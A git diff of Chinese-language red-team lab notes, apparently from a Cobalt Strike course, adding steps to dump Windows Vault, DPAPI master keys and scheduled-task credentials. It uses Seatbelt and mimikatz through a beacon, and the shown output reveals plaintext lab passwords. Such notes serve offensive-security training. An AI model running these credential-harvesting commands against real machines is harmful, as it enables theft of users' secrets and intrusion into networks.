@@ -26,7 +26,21 @@ credential manager blobs存储在```AppData```目錄
 ```
  beacon> mimikatz vault::list
 ```
+
+使用Seatbelt.exe,使用```WindowsVault```参数
+```
+beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault
+```
+
+或者```WindowsCredentialFiles```
+```
+beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsCredentialFiles
+```
+
+
 要解密凭据，需要找到```master encryption key```
+
+## 寻找GUID方法一
 
 执行```dpapi::cred```,指定要解密的凭据路径
 ```
@@ -74,6 +88,23 @@ guidMasterKey包含解密所需密钥的 GUID，上面是：```a23a1631-e2ca-480
  24b      fil     02/21/2021 11:49:40   Preferred
 ```
 
+## 寻找GUID方法二
+```
+beacon> mimikatz !sekurlsa::dpapi
+
+Authentication Id : 0 ; 1075454 (00000000:001068fe)
+Session           : RemoteInteractive from 2
+User Name         : bfarmer
+Domain            : DEV
+Logon Server      : DC-2
+Logon Time        : 9/6/2022 9:09:54 AM
+SID               : S-1-5-21-569305411-121244042-2357301523-1104
+   [00000000]
+   * GUID      :  {bfc5090d-22fe-4058-8953-47f6882f549e}
+   * Time      :  9/6/2022 11:27:44 AM
+   * MasterKey :  8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214
+   * sha1(key) :  897f7bf129e6a898ff4e20e9789009d5385be1f3
+```
 
 
 知道了GUID，利用mimikatz获取masterkey，需要system或管理员权限
@@ -127,4 +158,45 @@ Password : Sup3rman
 
 [*] Finished Google Chrome extraction.
 [*] Done.
+```
+
+# Scheduled Task Credentials
+
+计划任务可以保存凭据，以便它们可以在用户的​​上下文中运行，而无需登录。如果我们在机器上拥有本地管理员权限，我们可以用几乎相同的方式解密它们。Blob 保存在```C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\```
+
+```
+beacon> ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+ 10kb     fil     08/30/2022 12:42:24   DFBE70A7E5CC19A398EBF1B96859CE5D
+ 528b     fil     08/16/2022 14:55:28   F3190EBE0498B77B4A85ECBABCA19B6E
+```
+
+
+```dpapi::cred```可以告诉我们用于加密每个密钥的主密钥的 GUID
+```
+beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E
+
+guidMasterKey      : {aaa23e6b-bba8-441d-923c-ec242d6690c3}
+```
+
+```sekurlsa::dpapi```转储缓存的密钥
+```
+beacon> mimikatz !sekurlsa::dpapi
+
+   [00000000]
+   * GUID      :  {aaa23e6b-bba8-441d-923c-ec242d6690c3}
+   * Time      :  9/6/2022 12:14:38 PM
+   * MasterKey :  10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9
+   * sha1(key) :  cfbc842e78ee6713fa5dcb3c9c2d6c6d7c09f06c
+```
+
+解密
+```
+beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E /masterkey:10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9
+
+  TargetName     : Domain:batch=TaskScheduler:Task:{86042B87-C8D0-40A5-BB58-14A45356E01C}
+  UserName       : DEV\jking
+  CredentialBlob : Qwerty123
 ```
